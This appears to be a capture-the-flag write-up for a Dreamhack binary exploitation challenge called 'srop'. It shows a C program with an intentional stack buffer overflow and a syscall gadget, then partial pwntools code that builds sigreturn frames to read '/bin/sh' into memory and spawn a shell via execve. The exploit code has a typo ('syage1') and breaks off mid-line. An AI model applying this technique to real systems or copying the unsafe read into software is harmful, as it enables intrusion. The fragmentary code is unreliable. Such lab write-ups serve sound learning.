---
title: "[Dreamhack] srop - Write up"
date: 2024-01-15 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, srop, sigreturn, rop, nx, syscall, dreamhack]
author: datious
---

[Write up for dreamhack]__Challenge: srop | Author: datious

srop.c
```
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024); //vuln
}

```

The vulnerability in this program is a buffer overflow. This allows us hijack program's control flow.

#1. Analyze and Gather ingredients for exploitation
    - First, I check the protection layers of the program.
    ![image](https://hackmd.io/_uploads/rkqYSlDHGg.png)
    - As you can see, NX is enabled, so we can't execute shellcode on the stack.
    - Next, I checked whether useful gadgets exist in this program. 
    - I found a very interesting gadget. 
    
    
    ```
    0x00000000004004eb : pop rax ; syscall
    ```
    
- My idea is to leverage rt_sigreturn to write the **/bin/sh**   string into writable memory and execute **execve("/bin/sh")**.

#2. Exploitation and Strategy (SROP)
    2.1. Use rt_sigreturn to execute frame1(**read(0, rw_memory, len(stage2))**).(stage1)

```
frame1=SigreturnFrame()
frame1.rsp=rw
frame1.rax=0
frame1.rdi=0
frame1.rsi=rw
frame1.rdx=len(stage2)
frame1.rip=syscall
stage1=p64(1)
stage1+=p64(2)
syage1+=p64(15)
stage1+=p64(pop_rax_syscall)
stage1+=p64(15)

stage1+=bytes(frame1)
```
2.2 Send the **"/bin/sh"** string and arrange frame2 into writable memory.

```
stage2=p64(pop_rax_syscall)+p64(15)

frame2=Si
